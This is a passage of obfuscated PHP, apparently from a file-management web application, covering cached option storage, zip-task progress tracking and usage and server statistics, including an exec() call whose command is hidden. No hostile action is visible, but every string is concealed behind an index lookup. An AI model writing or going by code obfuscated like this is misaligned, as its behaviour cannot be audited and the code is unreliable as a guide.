$æ‡´Å£ï[$§¾×á¦][$£¢èû´È[487]]] = $æ‡´Å£ï[$§¾×á¦]; } return Model($this->modelType)->set($¹—¡ôñ±, !1, $this->optionType); } private function getAutoName($Š²µÍ¾Ñ) { $ü¤Ñ×â = array_to_keyvalue($this->listData(), $_SERVER[Ò°Ì”İ•][32]); if (!$ü¤Ñ×â || !isset($ü¤Ñ×â[$Š²µÍ¾Ñ])) { return $Š²µÍ¾Ñ; } for ($°ò¾Û» = 1; $°ò¾Û» < count($ü¤Ñ×â); $°ò¾Û»++) { $¼ÛöĞ’¹ = $Š²µÍ¾Ñ . "\50{$°ò¾Û»}\51"; if (!isset($ü¤Ñ×â[$¼ÛöĞ’¹])) { return $¼ÛöĞ’¹; } } return $¼ÛöĞ’¹; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÜÖƒ¬ú’ = false, $¥Åú±Ó = '', $³è®Ææ = false) { $›Òâšì =& $_SERVER[Ò°Ì”İ•]; $îÏ¡â€ğ = $this->cacheGet($¥Åú±Ó); $²¿¬âÍ = $this->optionDefault($¥Åú±Ó); $²¿¬âÍ = is_array($²¿¬âÍ) ? $²¿¬âÍ : array(); if (is_array($îÏ¡â€ğ)) { $îÏ¡â€ğ = array_merge($²¿¬âÍ, $îÏ¡â€ğ); return $ÜÖƒ¬ú’ ? isset($îÏ¡â€ğ[$ÜÖƒ¬ú’]) ? $îÏ¡â€ğ[$ÜÖƒ¬ú’] : null : $îÏ¡â€ğ; } $Äº¦­çˆ = $this->filterWhere(array($›Òâšì[33] => $¥Åú±Ó)); $îÏ¡â€ğ = $this->where($Äº¦­çˆ)->select(); $îÏ¡â€ğ = array_to_keyvalue($îÏ¡â€ğ, $›Òâšì[108], $›Òâšì[462]); foreach ($îÏ¡â€ğ as $†‘à¥ => $¾è¥•¾) { if ($³è®Ææ || in_array($†‘à¥, $this->jsonField)) { $îÏ¡â€ğ[$†‘à¥] = json_decode($¾è¥•¾, !0); } } $this->cacheSet($¥Åú±Ó, $îÏ¡â€ğ); $îÏ¡â€ğ = array_merge($²¿¬âÍ, $îÏ¡â€ğ); return $ÜÖƒ¬ú’ ? $îÏ¡â€ğ[$ÜÖƒ¬ú’] : $îÏ¡â€ğ; } public function set($µÌµô‰ä, $ÂİÊŸ´ = false, $Ù¦¯³– = '') { $Âûãì§À =& $_SERVER[Ò°Ì”İ•]; $this->cacheRemove($Ù¦¯³–); $½ÔáĞàÔ = array(); $ÏïöŞıë = is_array($µÌµô‰ä) ? $µÌµô‰ä : array($µÌµô‰ä => $ÂİÊŸ´); foreach ($ÏïöŞıë as $¸„°µ› => $ËõŒÍ½ƒ) { if (is_array($ËõŒÍ½ƒ)) { $ËõŒÍ½ƒ = json_encode_force($ËõŒÍ½ƒ); } $this->checkLength($ËõŒÍ½ƒ, !1, $this->tableName . $Âûãì§À[4] . $µÌµô‰ä); $ËõŒÍ½ƒ = self::textEncode($ËõŒÍ½ƒ); $ÏïöŞıë = array($Âûãì§À[33] => $Ù¦¯³–, $Âûãì§À[108] => $¸„°µ›, $Âûãì§À[462] => $ËõŒÍ½ƒ); $½ÔáĞàÔ[] = $this->filterWhere($ÏïöŞıë); } if (!$½ÔáĞàÔ) { return !0; } $Úµîšã = $this->cacheKey($Âûãì§À[488]); CacheLock::lock($Úµîšã); $Ôğã¾ºå = $this->addAll($½ÔáĞàÔ, array(), !0); CacheLock::unlock($Úµîšã); return $Ôğã¾ºå; } protected function optionDefault($úÚÍ²ÏŠ = '') { return !1; } public function setDeep($¢”öµâ, $Ì¦µš¾Ë = false, $äèç´Ú = '') { $¡ÂÕ”‡Û = explode($_SERVER[Ò°Ì”İ•][10], $¢”öµâ); $ıÙˆˆó = $this->get(); array_set_value($ıÙˆˆó, $¢”öµâ, $Ì¦µš¾Ë); $this->set($¡ÂÕ”‡Û[0], $ıÙˆˆó[$¡ÂÕ”‡Û[0]], $äèç´Ú); } public function remove($“èœÌ“Æ, $ı‰ ƒ¿‹ = '') { $ºª·òş =& $_SERVER[Ò°Ì”İ•]; $this->cacheRemove($ı‰ ƒ¿‹); $ôåìÇ½ = $this->filterWhere(array($ºª·òş[108] => $“èœÌ“Æ, $ºª·òş[33] => $ı‰ ƒ¿‹)); if (is_null($“èœÌ“Æ)) { unset($ôåìÇ½[$ºª·òş[108]]); } return $this->where($ôåìÇ½)->delete(); } public function cacheSet($éáÈÅ, $Ÿò•®ü = false) { return Cache::set($this->cacheKey($éáÈÅ), $Ÿò•®ü); } public function cacheGet($“ÒÌª§²) { return Cache::get($this->cacheKey($“ÒÌª§²)); } public function cacheRemove($à½µÃ¸) { return Cache::remove($this->cacheKey($à½µÃ¸)); } protected function filterWhere($ùî»¼ù±) { return $ùî»¼ù±; } protected function cacheKey($µ‡å„ª¬) { return $µ‡å„ª¬; } } goto BŠƒâ·…; DŒŸ†ÈŸ¡Ñ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $¯æÂª¥ =& $_SERVER[Ò°Ì”İ•]; parent::startAfter(); Hook::bind($¯æÂª¥[1894], array($this, $¯æÂª¥[1884])); Hook::bind($¯æÂª¥[1886], array($this, $¯æÂª¥[1887])); $Õ¯èìú¸ =& $this->task; $Õ¯èìú¸[$¯æÂª¥[1888]] = $¯æÂª¥[1275]; if (!$Õ¯èìú¸[$¯æÂª¥[1656]]) { $Õ¯èìú¸[$¯æÂª¥[1656]] = LNG($¯æÂª¥[1895]); } } protected function endAfter() { $÷€•»¾Ò =& $_SERVER[Ò°Ì”İ•]; parent::endAfter(); Hook::unbind($÷€•»¾Ò[1894], array($this, $÷€•»¾Ò[1884])); Hook::unbind($÷€•»¾Ò[1886], array($this, $÷€•»¾Ò[1887])); } public function updateAfter() { $úğåùİ¤ =& $_SERVER[Ò°Ì”İ•]; $„ƒõœ×ã =& $this->task; if (!$„ƒõœ×ã[$úğåùİ¤[1136]] || !$„ƒõœ×ã[$úğåùİ¤[836]]) { return; } if ($„ƒõœ×ã[$úğåùİ¤[1888]] == $úğåùİ¤[1275]) { $‡§¤ÅÁ = $„ƒõœ×ã[$úğåùİ¤[1823]]; if ($„ƒõœ×ã[$úğåùİ¤[1824]] != $úğåùİ¤[1275]) { $‡§¤ÅÁ = 0; } $ïˆÛìÖâ = ($„ƒõœ×ã[$úğåùİ¤[1827]] + $‡§¤ÅÁ) / $„ƒõœ×ã[$úğåùİ¤[836]]; $„ƒõœ×ã[$úğåùİ¤[1770]] = $ïˆÛìÖâ * 0.3; } else { if ($„ƒõœ×ã[$úğåùİ¤[1888]] == $úğåùİ¤[400]) { $ïˆÛìÖâ = $„ƒõœ×ã[$úğåùİ¤[1769]] / $„ƒõœ×ã[$úğåùİ¤[1136]]; $„ƒõœ×ã[$úğåùİ¤[1770]] = 0.3 + $ïˆÛìÖâ * 0.5; } else { if ($„ƒõœ×ã[$úğåùİ¤[1888]] == $úğåùİ¤[121]) { $ïˆÛìÖâ = 0; if ($„ƒõœ×ã[$úğåùİ¤[1822]]) { $ïˆÛìÖâ = $„ƒõœ×ã[$úğåùİ¤[1823]] / $„ƒõœ×ã[$úğåùİ¤[1822]]; } $„ƒõœ×ã[$úğåùİ¤[1770]] = 0.3 + 0.5 + $ïˆÛìÖâ * 0.2; } } } if ($„ƒõœ×ã[$úğåùİ¤[1770]] > 0) { $ËøÚ–Ÿç = timeFloat() - $„ƒõœ×ã[$úğåùİ¤[1772]] - $„ƒõœ×ã[$úğåùİ¤[1775]]; $„ƒõœ×ã[$úğåùİ¤[1776]] = $ËøÚ–Ÿç * (1 - $„ƒõœ×ã[$úğåùİ¤[1770]]) / $„ƒõœ×ã[$úğåùİ¤[1770]]; } } public function copyFileStart($ã¹‰°Ó¶, $¢ÀĞ¡—Ñ, $ÁŞ¦¡ˆ, $Ñ¿ ´°, $¼Äˆù˜Â, $»ğª•‘Æ) { $“Šûúô‘ =& $_SERVER[Ò°Ì”İ•]; parent::copyFileStart($ã¹‰°Ó¶, $¢ÀĞ¡—Ñ, $ÁŞ¦¡ˆ, $Ñ¿ ´°, $¼Äˆù˜Â, $»ğª•‘Æ); $°äøöÎë =& $this->task; if ($°äøöÎë[$“Šûúô‘[1888]] == $“Šûúô‘[400]) { $°äøöÎë[$“Šûúô‘[1888]] = $“Šûúô‘[121]; } $this->update(); } public function copyFileEnd($úÍ¢Œ¿, $ì¢ôİ…ü, $ı•àáñ„, $Ãøœë’š, $¿ó¼ç°Ò, $ÜÖØš÷©) { $üÉüïÄ =& $_SERVER[Ò°Ì”İ•]; $ËÑ¦˜ô¢ =& $this->task; $ËÑ¦˜ô¢[$üÉüïÄ[1823]] = $ËÑ¦˜ô¢[$üÉüïÄ[1822]]; $ËÑ¦˜ô¢[$üÉüïÄ[1827]] += $ËÑ¦˜ô¢[$üÉüïÄ[1822]]; $ËÑ¦˜ô¢[$üÉüïÄ[1824]] = $üÉüïÄ[12]; $this->update(); } public function zipEvent($²Ç¾Ö¦ß, $êö¶­, $Şôßğïñ, $İí¹ˆ€Ú) { $Ùº¢‰ÏÇ =& $_SERVER[Ò°Ì”İ•]; $Û™±ƒ¢Á =& $this->task; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1820]] = get_path_this($êö¶­); $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1822]] = $İí¹ˆ€Ú; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1823]] = $Şôßğïñ; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1138]] = $²Ç¾Ö¦ß == $Ùº¢‰ÏÇ[1896] ? $Ùº¢‰ÏÇ[1891] : $Ùº¢‰ÏÇ[1892]; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1824]] = $Ùº¢‰ÏÇ[12]; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[836]] = $İí¹ˆ€Ú; $Û™±ƒ¢Á[$Ùº¢‰ÏÇ[1888]] = $Ùº¢‰ÏÇ[400]; $this->update(); } public function nameParse($ÀÕá®ì) { $Ş­Æ¸’ô =& $_SERVER[Ò°Ì”İ•]; $ˆ¾œÓı =& $this->task; if ($ˆ¾œÓı[$Ş­Æ¸’ô[1769]] < $ˆ¾œÓı[$Ş­Æ¸’ô[1136]]) { $ˆ†Œ§Õå = get_path_this($ÀÕá®ì); if (strstr($ˆ†Œ§Õå, $Ş­Æ¸’ô[10])) { $ˆ¾œÓı[$Ş­Æ¸’ô[1769]] += 1; } } if ($ˆ¾œÓı[$Ş­Æ¸’ô[1888]] == $Ş­Æ¸’ô[1275]) { $ˆ¾œÓı[$Ş­Æ¸’ô[1888]] = $Ş­Æ¸’ô[400]; } $ˆ¾œÓı[$Ş­Æ¸’ô[1820]] = $ÀÕá®ì; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($šÚÒ»€´) { $¿‘ãîëˆ =& $_SERVER[Ò°Ì”İ•]; $Œøüûåñ = array($¿‘ãîëˆ[677] => array($¿‘ãîëˆ[33] => $¿‘ãîëˆ[1897], $¿‘ãîëˆ[362] => array($¿‘ãîëˆ[295], $¿‘ãîëˆ[838], $¿‘ãîëˆ[1898], $¿‘ãîëˆ[1899])), $¿‘ãîëˆ[1900] => array($¿‘ãîëˆ[33] => $¿‘ãîëˆ[1901], $¿‘ãîëˆ[362] => array($¿‘ãîëˆ[295], $¿‘ãîëˆ[836], $¿‘ãîëˆ[1902], $¿‘ãîëˆ[1903], $¿‘ãîëˆ[1904]))); if (!isset($Œøüûåñ[$šÚÒ»€´])) { return !1; } $this->optionType = $Œøüûåñ[$šÚÒ»€´][$¿‘ãîëˆ[33]]; $this->field = $Œøüûåñ[$šÚÒ»€´][$¿‘ãîëˆ[362]]; return !0; } public function listData($â‡î®Ù° = false, $Ğ¢„§¦ü = "\x6d\x6f\144\151\x66\x79\124\151\x6d\x65", $ü±„Ç©Ô = false) { return parent::listData($â‡î®Ù°, $Ğ¢„§¦ü, $ü±„Ç©Ô); } public function trendList($Ø‚Œ€Òè) { $úù§É½Ô =& $_SERVER[Ò°Ì”İ•]; $™Ğ–‘Ú = $this->listData(); if ($™Ğ–‘Ú) { $à¸óŒ‹ = end($™Ğ–‘Ú); $­Àç·£» = date($úù§É½Ô[1905], strtotime($úù§É½Ô[1906])); if ($à¸óŒ‹[$úù§É½Ô[295]] == $­Àç·£») { return $™Ğ–‘Ú; } $ï™¿¹×¨ = strtotime($à¸óŒ‹[$úù§É½Ô[295]]); } if (!isset($ï™¿¹×¨)) { $ÁÍ°êÈƒ = $Ø‚Œ€Òè == $úù§É½Ô[677] ? $úù§É½Ô[609] : $úù§É½Ô[898]; $ï™¿¹×¨ = Model($ÁÍ°êÈƒ)->min($úù§É½Ô[244]); } $ö÷áœ©£ = $úù§É½Ô[1907] . ucfirst($Ø‚Œ€Òè); $·ŸÙ¥“ƒ = $this->dateList($ï™¿¹×¨); foreach ($·ŸÙ¥“ƒ as $­Àç·£») { $this->{$ö÷áœ©£}($­Àç·£»); } return $this->listData(); } private function dateList($£ëòóóÖ) { $ó»É—±‘ =& $_SERVER[Ò°Ì”İ•]; $ÁçüÙ‹ä = $£ëòóóÖ; $¿ÔûÓ = strtotime($ó»É—±‘[1906]); $à•ö© ´ = array(); while ($ÁçüÙ‹ä <= $¿ÔûÓ) { $à•ö© ´[] = date($ó»É—±‘[1905], $ÁçüÙ‹ä); $ÁçüÙ‹ä = strtotime($ó»É—±‘[1908], $ÁçüÙ‹ä); } return $à•ö© ´; } public function _recordUser($äæ†Ó…† = '') { $àÀ÷ô®¨ =& $_SERVER[Ò°Ì”İ•]; $Ûá‹Ÿşñ = strtotime(date($àÀ÷ô®¨[1909], strtotime($äæ†Ó…†))); $ŞàüˆíÇ = strtotime(date($àÀ÷ô®¨[1910], strtotime($äæ†Ó…†))); $­ÜÂÂº× = array($àÀ÷ô®¨[244] => array($àÀ÷ô®¨[1086], $ŞàüˆíÇ)); $’òûÂì” = Model($àÀ÷ô®¨[609])->where($­ÜÂÂº×)->count($àÀ÷ô®¨[1768]); $­ÜÂÂº×[$àÀ÷ô®¨[244]] = array($àÀ÷ô®¨[420], array($Ûá‹Ÿşñ, $ŞàüˆíÇ)); $ŞØš‰ù = Model($àÀ÷ô®¨[609])->where($­ÜÂÂº×)->count($àÀ÷ô®¨[1768]); $­ÜÂÂº×[$àÀ÷ô®¨[33]] = $àÀ÷ô®¨[1911]; $½ÜœƒÆ‰ = Model($àÀ÷ô®¨[1912])->where($­ÜÂÂº×)->count($àÀ÷ô®¨[1913]); $‹Ì‰¼‰ = array($àÀ÷ô®¨[295] => $äæ†Ó…†, $àÀ÷ô®¨[838] => (int) $’òûÂì”, $àÀ÷ô®¨[1898] => (int) $ŞØš‰ù, $àÀ÷ô®¨[1899] => (int) $½ÜœƒÆ‰); return $this->insert($‹Ì‰¼‰); } public function _recordStore($È¸Ÿ¾¢Ñ = '') { $ı×Ì˜£ =& $_SERVER[Ò°Ì”İ•]; $ÍéèÄ‘ = strtotime(date($ı×Ì˜£[1910], strtotime($È¸Ÿ¾¢Ñ))); $¢“ÌÑ¶„ = array($ı×Ì˜£[244] => array($ı×Ì˜£[1086], $ÍéèÄ‘)); $¢şÑ©Âú = Model($ı×Ì˜£[556])->where($¢“ÌÑ¶„)->sum($ı×Ì˜£[90]); $¢“ÌÑ¶„[$ı×Ì˜£[497]] = 0; $ã’¿ìĞş = Model($ı×Ì˜£[898])->where($¢“ÌÑ¶„)->sum($ı×Ì˜£[90]); $¢“ÌÑ¶„[$ı×Ì˜£[201]] = 1; $ËË§»íÕ = Model($ı×Ì˜£[898])->where($¢“ÌÑ¶„)->sum($ı×Ì˜£[90]); $¢“ÌÑ¶„[$ı×Ì˜£[201]] = 2; $½ñµıøñ = Model($ı×Ì˜£[898])->where($¢“ÌÑ¶„)->sum($ı×Ì˜£[90]); $Ûˆœ±÷‘ = array($ı×Ì˜£[295] => $È¸Ÿ¾¢Ñ, $ı×Ì˜£[836] => (int) $ã’¿ìĞş, $ı×Ì˜£[1902] => (int) $¢şÑ©Âú, $ı×Ì˜£[1903] => (int) $ËË§»íÕ, $ı×Ì˜£[1904] => (int) $½ñµıøñ); return $this->insert($Ûˆœ±÷‘); } public function trend($×•âÂ˜˜, $©²„‚ºé) { $ªæ´Ìøâ =& $_SERVER[Ò°Ì”İ•]; if (!$this->init($×•âÂ˜˜)) { return !1; } $®ëÜø… = $this->trendList($×•âÂ˜˜); if ($®ëÜø… && $©²„‚ºé != $ªæ´Ìøâ[1740]) { $¥ÖıÔä = $®ëÜø…[0][$ªæ´Ìøâ[295]]; $Ñ«¬æ¡ò = $this->validDate($©²„‚ºé, $¥ÖıÔä); $‘•’ŞÙå = array(); $»ĞêÍ—Ô = array_to_keyvalue($®ëÜø…, $ªæ´Ìøâ[295]); foreach ($Ñ«¬æ¡ò as $åü½Øô) { if (isset($»ĞêÍ—Ô[$åü½Øô])) { $»™ûİüµ = $»ĞêÍ—Ô[$åü½Øô]; } else { $»™ûİüµ = end($®ëÜø…); $»™ûİüµ[$ªæ´Ìøâ[295]] = $åü½Øô; if ($×•âÂ˜˜ == $ªæ´Ìøâ[677]) { $»™ûİüµ[$ªæ´Ìøâ[1898]] = $»™ûİüµ[$ªæ´Ìøâ[1899]] = 0; } } $‘•’ŞÙå[] = $»™ûİüµ; } $®ëÜø… = $‘•’ŞÙå; } $ùÙ×ë× = array($ªæ´Ìøâ[677] => array($ªæ´Ìøâ[838] => LNG($ªæ´Ìøâ[1914]), $ªæ´Ìøâ[1898] => LNG($ªæ´Ìøâ[1915]), $ªæ´Ìøâ[1899] => LNG($ªæ´Ìøâ[1916])), $ªæ´Ìøâ[1900] => array($ªæ´Ìøâ[836] => LNG($ªæ´Ìøâ[1917]), $ªæ´Ìøâ[1902] => LNG($ªæ´Ìøâ[1918]), $ªæ´Ìøâ[1903] => LNG($ªæ´Ìøâ[1919]), $ªæ´Ìøâ[1904] => LNG($ªæ´Ìøâ[1920]))); $¥…áÊÎ = array($ªæ´Ìøâ[677] => $ªæ´Ìøâ[1921], $ªæ´Ìøâ[1900] => $ªæ´Ìøâ[90]); if (empty($®ëÜø…)) { $åü½Øô = date($ªæ´Ìøâ[1905], strtotime($ªæ´Ìøâ[1906])); $¢üÔá‰Š = array($ªæ´Ìøâ[295] => $åü½Øô); foreach ($ùÙ×ë×[$×•âÂ˜˜] as $æÄùÑò¯ => $¬Óá›¡) { $¢üÔá‰Š[$æÄùÑò¯] = 0; } $®ëÜø…[] = $¢üÔá‰Š; } $ë¼¼¹é° = array(); foreach ($®ëÜø… as $¬Óá›¡) { if ($×•âÂ˜˜ == $ªæ´Ìøâ[1900] && $¬Óá›¡[$ªæ´Ìøâ[1902]] > $¬Óá›¡[$ªæ´Ìøâ[836]]) { $¬Óá›¡[$ªæ´Ìøâ[1902]] = $¬Óá›¡[$ªæ´Ìøâ[836]]; } foreach ($ùÙ×ë×[$×•âÂ˜˜] as $æÄùÑò¯ => $é ÛÕÂì) { $»™ûİüµ = array($ªæ´Ìøâ[295] => $¬Óá›¡[$ªæ´Ìøâ[295]], $ªæ´Ìøâ[1656] => $é ÛÕÂì); $»™ûİüµ[$¥…áÊÎ[$×•âÂ˜˜]] = isset($¬Óá›¡[$æÄùÑò¯]) ? $¬Óá›¡[$æÄùÑò¯] : 0; $ë¼¼¹é°[] = $»™ûİüµ; } } return $ë¼¼¹é°; } public function validDate($Ä¼èÆõë, $ªÄªÖè) { $İŞ›ŞÄ» =& $_SERVER[Ò°Ì”İ•]; $ªúÑ¹ßœ = date($İŞ›ŞÄ»[1905], strtotime($İŞ›ŞÄ»[1906])); $òÀûõ— = array($ªúÑ¹ßœ); switch ($Ä¼èÆõë) { case $İŞ›ŞÄ»[1747]: $˜·–Åõ¡ = mktime(0, 0, 0, date($İŞ›ŞÄ»[1922]), date($İŞ›ŞÄ»[1448]) - date($İŞ›ŞÄ»[1538]) + 7 - 7, date($İŞ›ŞÄ»[1923])); $”Ì¿Õ›Œ = 0; do { $°¡Ö¿Ëã = date($İŞ›ŞÄ»[1905], $˜·–Åõ¡ - 3600 * 24 * 7 * $”Ì¿Õ›Œ); $òÀûõ—[] = $°¡Ö¿Ëã; $”Ì¿Õ›Œ++; } while ($ªÄªÖè < $°¡Ö¿Ëã); break; case $İŞ›ŞÄ»[1745]: $”Ì¿Õ›Œ = 1; do { $‘ŠÂ“Ö™ = date($İŞ›ŞÄ»[1924], strtotime("\x2d\x20{$”Ì¿Õ›Œ}\x20\155\x6f\156\x74\150\163")); $òÀûõ—[] = $‘ŠÂ“Ö™; $”Ì¿Õ›Œ++; } while ($ªÄªÖè < $‘ŠÂ“Ö™); break; case $İŞ›ŞÄ»[1925]: $Ïäşè = (int) date($İŞ›ŞÄ»[1923], strtotime($ªÄªÖè)); $¦‚ˆóóá = (int) date($İŞ›ŞÄ»[1923]); if ($Ïäşè >= $¦‚ˆóóá) { break; } for ($Ïäşè; $Ïäşè < $¦‚ˆóóá; $Ïäşè++) { $òÀûõ—[] = $Ïäşè . $İŞ›ŞÄ»[1926]; } break; default: break; } if ($ªÄªÖè > end($òÀûõ—)) { array_pop($òÀûõ—); } sort($òÀûõ—); return $òÀûõ—; } public function listTable($ÛÎ¸Áæñ) { $Øİ±ŒÂ = ucfirst($ÛÎ¸Áæñ); return Model($Øİ±ŒÂ)->listData(); } public function option($·Òú¡ÀÔ) { $ó×İ˜¨… = $_SERVER[Ò°Ì”İ•][1927] . ucfirst($·Òú¡ÀÔ); return $this->{$ó×İ˜¨…}(); } private function optionUser() { $¡‹¿í™¥ =& $_SERVER[Ò°Ì”İ•]; $şûçò½Š = Model($¡‹¿í™¥[609])->count($¡‹¿í™¥[1768]); $—Ì¯ó«å = Model($¡‹¿í™¥[609])->where($¡‹¿í™¥[1928])->count($¡‹¿í™¥[1768]); $µÃ¦øş = intval($GLOBALS[$¡‹¿í™¥[6]][$¡‹¿í™¥[436]][$¡‹¿í™¥[1713]]) / 3600; $§èš—™÷ = strtotime("\55{$µÃ¦øş}\40\150\157\165\162\x73"); $†ùº„°š = strtotime(date($¡‹¿í™¥[1909])); if ($§èš—™÷ < $†ùº„°š) { $§èš—™÷ = $†ùº„°š; } $Äˆ‘†á = array($¡‹¿í™¥[1929] => array($¡‹¿í™¥[1087], $§èš—™÷)); $Ú›êÈÂ³ = (int) Model($¡‹¿í™¥[609])->where($Äˆ‘†á)->count($¡‹¿í™¥[1768]); if (!$Ú›êÈÂ³) { $Ú›êÈÂ³ = 1; } $Äˆ‘†á = array($¡‹¿í™¥[1929] => array($¡‹¿í™¥[1087], $†ùº„°š)); $İåÀ»‡æ = Model($¡‹¿í™¥[609])->where($Äˆ‘†á)->count($¡‹¿í™¥[1768]); return array($¡‹¿í™¥[831] => (int) $şûçò½Š, $¡‹¿í™¥[1930] => (int) ($şûçò½Š - $—Ì¯ó«å), $¡‹¿í™¥[1931] => (int) $—Ì¯ó«å, $¡‹¿í™¥[1932] => (int) $İåÀ»‡æ, $¡‹¿í™¥[1933] => $Ú›êÈÂ³); } private function optionFile() { $«Ï¢†µ÷ =& $_SERVER[Ò°Ì”İ•]; $§±ˆ‘Éˆ = $this->sourceSize(); $ÁêÃò© = $§±ˆ‘Éˆ[$«Ï¢†µ÷[90]]; $¤£Òñş = $§±ˆ‘Éˆ[$«Ï¢†µ÷[1902]]; $”ùŞÅ²… = Model($«Ï¢†µ÷[898])->where(array($«Ï¢†µ÷[497] => 0))->count($«Ï¢†µ÷[204]); $ô®˜Õ÷ô = array($«Ï¢†µ÷[497] => 0, $«Ï¢†µ÷[244] => array($«Ï¢†µ÷[1087], strtotime(date($«Ï¢†µ÷[1909])))); $“–²ù¯µ = Model($«Ï¢†µ÷[898])->where($ô®˜Õ÷ô)->sum($«Ï¢†µ÷[90]); $·¥é¾´í = Model($«Ï¢†µ÷[898])->where($ô®˜Õ÷ô)->count($«Ï¢†µ÷[204]); return array($«Ï¢†µ÷[836] => $ÁêÃò©, $«Ï¢†µ÷[1902] => $¤£Òñş, $«Ï¢†µ÷[1934] => $ÁêÃò© - $¤£Òñş, $«Ï¢†µ÷[1935] => (int) $“–²ù¯µ, $«Ï¢†µ÷[838] => (int) $”ùŞÅ²…, $«Ï¢†µ÷[1936] => (int) $·¥é¾´í); } private function optionAccess() { $¬¡ªƒ±¤ =& $_SERVER[Ò°Ì”İ•]; return array($¬¡ªƒ±¤[831] => $this->typeLogCnt(), $¬¡ªƒ±¤[121] => $this->typeLogCnt($¬¡ªƒ±¤[121]), $¬¡ªƒ±¤[537] => $this->typeLogCnt($¬¡ªƒ±¤[537]), $¬¡ªƒ±¤[1937] => $this->typeLogCnt($¬¡ªƒ±¤[1937]), $¬¡ªƒ±¤[1938] => $this->typeLogCnt($¬¡ªƒ±¤[1938]), $¬¡ªƒ±¤[677] => $this->typeLogCnt($¬¡ªƒ±¤[12], $¬¡ªƒ±¤[1913])); } private function typeLogCnt($¾·ã˜Øû = '', $è³á‰ = "\151\144") { $èÔü® =& $_SERVER[Ò°Ì”İ•]; $º¦‚šÖ» = array($èÔü®[121] => array($èÔü®[1939], $èÔü®[1940]), $èÔü®[537] => array($èÔü®[1941], $èÔü®[1942]), $èÔü®[1937] => array($èÔü®[1943], $èÔü®[1944], $èÔü®[1945]), $èÔü®[1938] => array($èÔü®[1946], $èÔü®[1947]), $èÔü®[1948] => array($èÔü®[1949], $èÔü®[1950], $èÔü®[1951])); $¹ Ğ§Ò = strtotime(date($èÔü®[1909])); $ãÑ‰¿£ú = array($èÔü®[244] => array($èÔü®[1087], $¹ Ğ§Ò)); if ($¾·ã˜Øû) { $ãÑ‰¿£ú[$èÔü®[33]] = array($èÔü®[7], $º¦‚šÖ»[$¾·ã˜Øû]); } $Ã·”ä½é = Model($èÔü®[1912])->where($ãÑ‰¿£ú)->count($è³á‰); return (int) $Ã·”ä½é; } private function optionServer() { $È™ãöÈ¦ =& $_SERVER[Ò°Ì”İ•]; $Ë¦ê«æ = $this->diskDriver(); $àû…ë´â = KodIO::defaultDriver(); $ÆÎãâÛù = array($È™ãöÈ¦[891] => $àû…ë´â[$È™ãöÈ¦[487]]); $»ÜçùòÂ = Model($È™ãöÈ¦[556])->where($ÆÎãâÛù)->sum($È™ãöÈ¦[90]); $ôÆÌ½Ñä = explode($È™ãöÈ¦[53], $_SERVER[$È™ãöÈ¦[158]]); $îŞ±ƒş² = $ôÆÌ½Ñä[0]; $Í°œÄı˜ = $GLOBALS[$È™ãöÈ¦[6]][$È™ãöÈ¦[21]]; $·İéÌŸ = $Í°œÄı˜[$È™ãöÈ¦[1049]]; if ($·İéÌŸ == $È™ãöÈ¦[1037]) { $–³Åô† = explode($È™ãöÈ¦[1364], $Í°œÄı˜[$È™ãöÈ¦[1048]]); $·İéÌŸ = $–³Åô†[0]; } if ($·İéÌŸ == $È™ãöÈ¦[985] || $·İéÌŸ == $È™ãöÈ¦[878]) { $¢±â«¿ = Model()->db()->query($È™ãöÈ¦[1952]); $‰ğ¹§çİ = $¢±â«¿[0] && isset($¢±â«¿[0][$È™ãöÈ¦[1655]]) ? $¢±â«¿[0][$È™ãöÈ¦[1655]] : 0; $·İéÌŸ = $È™ãöÈ¦[1953] . ($‰ğ¹§çİ ? $È™ãöÈ¦[8] . $‰ğ¹§çİ : $È™ãöÈ¦[12]); } $¡Šß–Ïå = $GLOBALS[$È™ãöÈ¦[6]][$È™ãöÈ¦[436]][$È™ãöÈ¦[900]]; return array($È™ãöÈ¦[1954] => $Ë¦ê«æ ? $Ë¦ê«æ[$È™ãöÈ¦[1955]] : 0, $È™ãöÈ¦[1956] => $Ë¦ê«æ ? $Ë¦ê«æ[$È™ãöÈ¦[1957]] : 0, $È™ãöÈ¦[1958] => (int) $àû…ë´â[$È™ãöÈ¦[1955]] * 1024 * 1024 * 1024, $È™ãöÈ¦[1959] => (int) $»ÜçùòÂ, $È™ãöÈ¦[1960] => ucfirst($îŞ±ƒş²), $È™ãöÈ¦[1961] => $È™ãöÈ¦[1962] . PHP_VERSION, $È™ãöÈ¦[1963] => phpBuild64() ? 64 : 32, $È™ãöÈ¦[830] => str_replace($È™ãöÈ¦[1205], $È™ãöÈ¦[1065], $·İéÌŸ), $È™ãöÈ¦[436] => ucfirst($¡Šß–Ïå), $È™ãöÈ¦[32] => $_SERVER[$È™ãöÈ¦[1964]]); } private function diskDriver() { $–åÅÖƒ =& $_SERVER[Ò°Ì”İ•]; $“«èÉˆõ = $–åÅÖƒ[8]; $½§åğšï = $GLOBALS[$–åÅÖƒ[6]][$–åÅÖƒ[1381]] == $–åÅÖƒ[1382]; if ($½§åğšï) { $“«èÉˆõ = $–åÅÖƒ[1965]; if (function_exists($–åÅÖƒ[1966])) { exec($–åÅÖƒ[1967], $½Ä­¹«–); $“«èÉˆõ = $½Ä­¹«–[1] . $–åÅÖƒ[8]; } } if (!file_exists($“«èÉˆõ)) { return; } if (!function_exists($–åÅÖƒ[1968])) { return; } $ßÅû¿õı = @disk_total_space($“«èÉˆõ); $é€ƒŒé© = $ßÅû¿õı - @disk_free_space($“«èÉˆõ); return array($–åÅÖƒ[1955] => $ßÅû¿õı, $–åÅÖƒ[1957] => $é€ƒŒé©); } public function fileChart($¥Ë‡âï) { $™ôğÏøÕ =& $_SERVER[Ò°Ì”İ•]; if (isset($¥Ë‡âï[$™ôğÏøÕ[1768]])) { return Model($™ôğÏøÕ[898])->userFileTypeProfile($¥Ë‡âï[$™ôğÏøÕ[1768]]); } if (isset($¥Ë‡âï[$™ôğÏøÕ[1969]])) { return Model($™ôğÏøÕ[898])->groupFileTypeProfile($¥Ë‡âï[$™ôğÏøÕ[1969]]); } $ğúì‚ñ = $this->sourceSize(); $Ê•§šÔ = array($™ôğÏøÕ[203] => 0, 